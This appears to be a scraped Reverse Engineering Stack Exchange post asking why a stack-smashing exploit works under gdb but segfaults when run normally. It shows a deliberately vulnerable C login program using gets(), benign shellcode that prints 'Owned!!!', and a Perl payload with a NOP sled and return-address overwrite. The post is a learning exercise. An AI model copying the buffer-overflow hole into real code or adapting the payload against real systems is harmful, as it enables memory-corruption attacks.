{
    "title": "Stack smashing in X86_64 leads to Segmentation fault .",
    "link": "https://reverseengineering.stackexchange.com/questions/12762/stack-smashing-in-x86-64-leads-to-segmentation-fault",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I been trying to smash the stack in an x86_64 machine , the payload gets executed when I use a debugger (gdb) and fails with Segmentation fault\nwhen I run it normally </p>\n<p>Here is the vulnerable program </p>\n<pre><code>#include &lt;stdio.h&gt;\n\nchar *secret = \"Password\";\n\nvoid go_shell()\n{\n    char *shell =  \"/bin/sh\";\n    char *cmd[] = { \"/bin/sh\", 0 };\n    printf(\"Would you like to play a game...\\n\");\n    setreuid(0);\n    execve(shell,cmd,0);\n}\n\nint authorize()\n{\n    char password[64];\n    printf(\"Enter Password: \");\n    gets(password);\n    if (!strcmp(password,secret))\n        return 1;\n    else\n        return 0;\n}\n\nint main()\n{\n    if (authorize())\n    {\n        printf(\"login successful\\n\");\n        go_shell();\n    } else {\n        printf(\"Incorrect password\\n\");\n    }\n    return 0;\n}\n</code></pre>\n<p>compiled as : gcc simple_login.c -o login -z execstack -fno-stack-protector -g</p>\n<p>ASLR turned off </p>\n<p>Here is My payload in assembly </p>\n<pre><code>section .text\nglobal _start\n\n_start:\nxor rax, rax ; syscall\nxor rdi, rdi ; arg1\nxor rsi, rsi ; arg2\nxor rdx, rdx ; arg3\n\n; write(int fd, char *msg, unsigned int len)\nnop\nmov al, 1\ninc di\ninc di\n;Owned!!! =  4f,77,6e,65,64,21,21,21\n;push !,!,!,d\n;push e,n,w,O\nmov rcx,0x21212164656e774f\npush rcx\nmov rsi, rsp\nmov dl, 8 \nsyscall\n\n; exit(int ret)\n;xor rax,rax\nmov al, 0x3c\nxor rdi, rdi\nsyscall\n</code></pre>\n<p><a href=\"https://i.sstatic.net/1dSBX.png\" rel=\"nofollow noreferrer\"><img alt=\"enter image description here\" src=\"https://i.sstatic.net/1dSBX.png\"/></a></p>\n<pre><code>#!/usr/bin/perl\nprint \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"; // extra padding\nprint \"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\";\nprint \"\\xb0\\x01\\x66\\xff\\xc7\\x66\\xff\\xc7\\x48\\xb9\\x4f\\x77\";\nprint \"\\x6e\\x65\\x64\\x21\\x21\\x21\\x51\\x48\\x89\\xe6\\xb2\\x08\";\nprint \"\\x0f\\x05\\xb0\\x3c\\x48\\x31\\xff\\x0f\\x05\";\nprint \"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\"; // rbp\nprint \"\\xd8\\xe1\\xff\\xff\\xff\\x7f\\x00\\x00\"; //return address\n</code></pre>\n<p>On debugger </p>\n<p><a href=\"https://i.sstatic.net/Ap5gp.png\" rel=\"nofollow noreferrer\"><img alt=\"enter image description here\" src=\"https://i.sstatic.net/Ap5gp.png\"/></a></p>\n<p>While Executing in a debugger it works fine and the message Owned!!! is printed out , but when I run the file normally I get Segmentation Error \nAny Solution on whats happening here ?  </p>\n</div>",
    "votes": "-1",
    "answers": 1,
    "views": "914",
    "tags": [
        "assembly",
        "x86",
        "exploit",
        "stack"
    ],
    "user": "Dhayalan Pro",
    "time": "May 29, 2016 at 21:15",
    "comments": [
        {
            "user": "broadway",
            "text": "<span class=\"comment-copy\">Sounds like you didn't disable aslr, or maybe the return address is wrong. On my system, around 0x7fffffffdea0 will correctly execute the shellcode. I'd recommend printing the address of password inside authorize, and ensure that you're getting a static value on multiple invocations and/or look at /proc/sys/kernel/randomize_va_space and make sure it's 0.</span>",
            "time": null
        },
        {
            "user": "Dhayalan Pro",
            "text": "<span class=\"comment-copy\">@broadway the address of payload that I obtained was from the stack as it will be [esp] so 0x7fffffffe1d0 which worked in GDB crashed in normal  I printed out address via C and used that  0x7fffffffe2a0 which worked normally but crashes in gdb lol</span>",
            "time": null
        },
        {
            "user": "Dhayalan Pro",
            "text": "<span class=\"comment-copy\">thats why it was working in gdb and not if i execute normally , now it works normally and not in gdb , Anyidea why its happeneing ?</span>",
            "time": null
        },
        {
            "user": "Dhayalan Pro",
            "text": "<span class=\"comment-copy\"><a href=\"http://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966\" title=\"buffer overflow works in gdb but not without it\">stackoverflow.com/questions/17775186/â€¦</a>  Seems to be the reason but yet the addresses are different :</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>The issue was that the OS pushes some env on the stack which creates this offset in memory when the program is run on gdb ,which can be resolved by removing the env . \nmore about this can be found at <a href=\"https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966\">https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966</a></p>\n</div>",
            "votes": "0",
            "user": "Community",
            "time": "May 23, 2017 at 12:37",
            "is_accepted": true,
            "comments": []
        }
    ]
}